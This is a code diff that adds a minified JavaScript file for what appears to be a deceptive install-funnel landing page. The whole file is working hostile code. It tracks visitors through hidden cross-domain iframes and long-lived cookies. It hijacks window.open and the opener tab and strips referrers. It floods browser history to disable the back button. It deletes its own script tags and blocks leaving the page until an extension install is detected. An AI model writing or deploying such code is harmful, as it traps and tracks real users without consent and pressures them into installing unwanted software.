@@ -1,0 +1,35 @@
+var getQueryVariable=function(name,str){str==undefined&&(str=location.search);return decodeURIComponent((new RegExp('(?:^|[&?])'+name+'=(.+?)(&|#|$)').exec(str)||[null,''])[1].replace(/\+/g,' '))||null;};var replaceQueryVariable=function(name,value){var str=location.search||'?';return(str.replace(new RegExp('(\\?|&)'+name+'[^&#]*(&*|)','g'),'$1')+'&'+name+'='+encodeURIComponent(value)).replace('?&','?').replace(/&+/g,'&');};var getURLParameter=getQueryVariable;var replaceURLParameter=replaceQueryVariable;function getCookie(name,str){str==undefined&&(str=document.cookie);var matches=str.match(new RegExp("(?:^|; )"+name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,'\\$1')+"=([^;]*)"));return matches?decodeURIComponent(matches[1]):undefined;}
+function setCookie(name,value,props){props=props||{};var exp=props.expires;if(typeof exp=="number"&&exp){var d=new Date();d.setTime(d.getTime()+exp*1000);exp=props.expires=d;}
+if(exp&&exp.toUTCString){props.expires=exp.toUTCString();}
+value=encodeURIComponent(value);var updatedCookie=name+"="+value;for(var propName in props)if(props.hasOwnProperty(propName)){updatedCookie+="; "+propName;var propValue=props[propName];if(propValue!==true){updatedCookie+="="+propValue;}}
+document.cookie=updatedCookie;}
+function getOffer(){return getURLParameter('offer')||"about:blank";}
+function setFullScreen(){if(document.documentElement.requestFullScreen){document.documentElement.requestFullScreen();}else if(document.documentElement.mozRequestFullScreen){document.documentElement.mozRequestFullScreen();}else if(document.documentElement.webkitRequestFullScreen){document.documentElement.webkitRequestFullScreen();}}
+function speakText(text,lang){return new Promise(function(res,rej){try{var speech=new SpeechSynthesisUtterance(text);speech.lang=lang;speechSynthesis.speak(speech).then(res).catch(function(){});}catch(error){}});}
+function bySelector(selector){if(!document.querySelector)
+return null;return document.querySelector(selector);}
+function addEvent(nodes,event,callback){if(!nodes)return;if(!Array.isArray(nodes))
+nodes=[nodes];for(var i=0;i<nodes.length;i++)
+if(nodes[i]&&nodes[i].addEventListener)
+nodes[i].addEventListener(event,callback);}
+function setLongCookie(name,value){if(!getCookie(name))
+setCookie(name,value,{path:'/',expires:365*24*3600,domain:location.hostname,SameSite:'None',Secure:true});}
+var onPixelLoaded=function(){};if(typeof Array.isArray==='undefined'){Array.isArray=function(obj){return Object.prototype.toString.call(obj)==='[object Array]';};}
+(function(){var getPbFrameCookie=function(name){return getCookie(name,pbFrameCookies);};var getRedirFrameCookie=function(name){return getCookie(name,redirFrameCookies);};var getSavedSubid=function(){return getURLParameter('s');};var saveSubid=function(){setLongCookie('s',getSavedSubid());};saveSubid();var rootLandingsPath=location.pathname.replace(/(\/|)([^/]+\.(html|htm|php)|)$/,'').replace(/[/]*prtk([/]+[^./]*[/]*|)$/,'')+'/';var pbDirectory=rootLandingsPath+'_pb/';var pbFrameCookies='';var pbFrameWindow;var redirFrameCookies='';var isPbFrame=(location.pathname.split('/').pop()=='commonfr.html');(function(){if(isPbFrame)return;var pixelLoaded=false;var onPixelLoadedCallbacks=[];onPixelLoaded=function(callback){if(pixelLoaded)
+setTimeout(callback,0);else
+onPixelLoadedCallbacks.push(callback);};var triggerPixelLoaded=function(){pixelLoaded=true;var call=function(f){setTimeout(f,0);};for(var i=0;i<onPixelLoadedCallbacks.length;i++){call(onPixelLoadedCallbacks[i]);}
+onPixelLoadedCallbacks=[];};window.addEventListener("message",function(evt){if(!evt)return;if((evt.origin||'').indexOf(window.commonCookieDomain||'NOCOMMONDOMAIN')>=0){pbFrameCookies=evt.data||pbFrameCookies||'';}else{redirFrameCookies=evt.data||redirFrameCookies||'';}},false);var loadPixel=function(){if(window.commonCookieDomain){var iframe=document.createElement('iframe');var iframeRelURL=pbDirectory+'commonfr.html'+
+replaceURLParameter('s',getSavedSubid());iframe.setAttribute('src','https://'+window.commonCookieDomain+iframeRelURL);iframe.setAttribute('style','display:none !important');iframe.onload=function(){triggerPixelLoaded();pbFrameWindow=iframe.contentWindow;};document.body.appendChild(iframe);}else{triggerPixelLoaded();}};if(document.body)
+loadPixel();else
+document.addEventListener('DOMContentLoaded',loadPixel);})();(function(){if(isPbFrame)return;var tmt=setInterval(function(){var cookieName='dmn';var dmn=getPbFrameCookie(cookieName)||getRedirFrameCookie(cookieName)||getCookie(cookieName);if(!dmn)return;clearInterval(tmt);setLongCookie(cookieName,dmn);onPixelLoaded(function(){if(pbFrameWindow)
+pbFrameWindow.postMessage(cookieName+'='+dmn,'*');});var iframe=document.createElement('iframe');var iframeRelURL=pbDirectory+'redirfr.html?mode=interval&s='+getSavedSubid();var iframeAbsURL='https://'+dmn+'/get_redirfr/'+location.protocol+'//'+document.domain+'/'+iframeRelURL;iframe.setAttribute('src',iframeAbsURL);iframe.setAttribute('style','display:none !important');document.body.appendChild(iframe);},100);})();var setMetaReferrer=function(value){var metas=document.getElementsByTagName('meta');for(var i=0;i<metas.length;i++)
+if(metas[i].getAttribute('name')=='referrer')
+metas[i].parentNode.removeChild(metas[i]);var meta=document.createElement('meta');meta.setAttribute('name','referrer');meta.setAttribute('content',value);document.head.appendChild(meta);};(function(){if(isPbFrame)return;window._openOrig=window.open;var windowsOpened=[];setMetaReferrer('no-referrer');window.open=function(url,name,params){var res=window._openOrig("","_blank",params);if(!res)return res;res.location.href=url;windowsOpened.push(res);return res;};var interval=false;var url='https://www.bing.com';window.closeLandingOnInstall=function(localURL){if(localURL)
+url=localURL;interval=setInterval(function(){var cookieName='xadeinst';var isInstalled=false;if(getRedirFrameCookie('s'))
+isInstalled=true;if(getCookie(cookieName)||getPbFrameCookie(cookieName)){isInstalled=true;setLongCookie(cookieName,"1");onPixelLoaded(function(){if(pbFrameWindow)
+pbFrameWindow.postMessage(cookieName,'*');});}
+if(isInstalled){clearInterval(interval);window.onbeforeunload=null;for(var i=0;i<windowsOpened.length;i++){var win=windowsOpened[i];win.location='about:blank';setTimeout(win.close,100);}
+setMetaReferrer('no-referrer');setTimeout(function(){location.href=url;},150);}},500);};if(parent.window.opener){parent.window.opener.location=window.location;}
+(function(){var t;try{for(t=0;10>t;++t)
+history.pushState({},"","#");window.onpopstate=function(t){if(t.state)location.replace("#");};}catch(error){}})();document.addEventListener('DOMContentLoaded',function(){var s=document.querySelectorAll("script");for(var i=0;i<s.length;i++)
+s[i].parentNode.removeChild(s[i]);window.onbeforeunload=function(event){return "";};});})();})();
